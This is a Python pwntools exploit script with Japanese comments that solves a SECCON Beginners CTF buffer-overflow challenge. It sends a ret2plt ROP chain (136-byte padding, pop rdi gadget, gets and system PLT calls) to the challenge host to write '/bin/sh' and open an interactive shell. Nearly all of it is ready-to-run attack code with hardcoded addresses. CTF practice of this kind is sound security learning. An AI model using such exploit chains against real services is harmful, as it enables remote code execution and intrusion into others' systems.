# coding: utf-8

# exploitの流れ
# ret2plt + ROPでgetsとsystemを使う
# 1. gets関数を呼び出し、書き込み可能な領域に"/bin/sh"を保存:gets(0x601070)
# 2. system関数を先ほど保存した"/bin/sh"を引数にして呼び出し:system(0x601070)

# [*] 今回は関数の呼び出し規約的に引数をrdiに積む方式だった!!!!!
# コード実行時のStackの状態
#--------------------
# bof              : 136bytes
#--------------------
# return addr      : pop_rdi_ret
# argument         : data_seg
# next addr        : gets_plt
#--------------------
# return addr      : pop_rdi_ret
# argument         : data_seg
# next return addr : system_plt
#--------------------

from pwn import *
import time
system_plt = 0x400540
gets_plt   = 0x400570
data_seg   = 0x601070
pop_rdi_ret = 0x400763

context.binary = "./bbs"
e = ELF("bbs")

offset = 136

#host = "192.168.250.171"
#port = 20000
host = "pwn1.chall.beginners.seccon.jp"
port = 18373

rop = "A" * offset
rop += p64(pop_rdi_ret)
rop += p64(data_seg)
rop += p64(e.plt["gets"])
rop += p64(pop_rdi_ret)
rop += p64(data_seg)
rop += p64(e.plt["system"])
rop += p64(0xdeadbeef) 
p = remote(host, port)

print(p.recvuntil("Input Content : "))

p.sendline(rop)
p.sendline("/bin/sh")

p.interactive()
